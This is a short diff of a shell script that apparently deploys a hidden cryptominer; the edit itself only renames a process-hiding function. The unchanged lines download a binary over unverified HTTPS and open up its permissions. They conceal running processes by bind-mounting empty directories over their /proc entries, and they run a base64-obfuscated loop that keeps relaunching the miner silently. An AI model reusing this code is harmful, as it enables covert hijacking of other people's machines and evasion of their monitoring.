@@ -13,7 +13,7 @@ cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep
 [ -n "$cores" ] || cores=1
 [ "$cores" -gt "2" ] && rx="[`seq -s ', ' 0 $((cores - 2))`]" || rx=""
 
-proc() {
+procPid() {
   [ -d "/proc/$1" ] && [ ! -d "/tmp/.proc/$1" ] && mkdir -p "/tmp/.proc/$1" && mount -o bind "/tmp/.proc/$1" "/proc/$1" && return 0 || return 1
 }
 
@@ -29,7 +29,7 @@ wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
 chmod -R 777 "${work}"
 
 
-proc "$$"
+procPid "$$"
 sh <(echo 'd2hpbGUgdHJ1ZTsgZG8KICBuaWNlIC1uIDE5IC90bXAvLmNvbmZpZy9pZGxlIC1jIC90bXAvLmNvbmZpZy9jb25maWcuanNvbiA+L2Rldi9udWxsIDI+JjEgJgogIHBpZD0iJCEiCiAgbWtkaXIgLXAgIi90bXAvLnByb2MvJHBpZCIgJiYgbW91bnQgLW8gYmluZCAiL3RtcC8ucHJvYy8kcGlkIiAiL3Byb2MvJHBpZCIKICB3YWl0ICIkcGlkIgpkb25lCg==' |base64 -d) &
-proc "$!"
+procPid "$!"
 [ "$mode" == "1" ] && wait
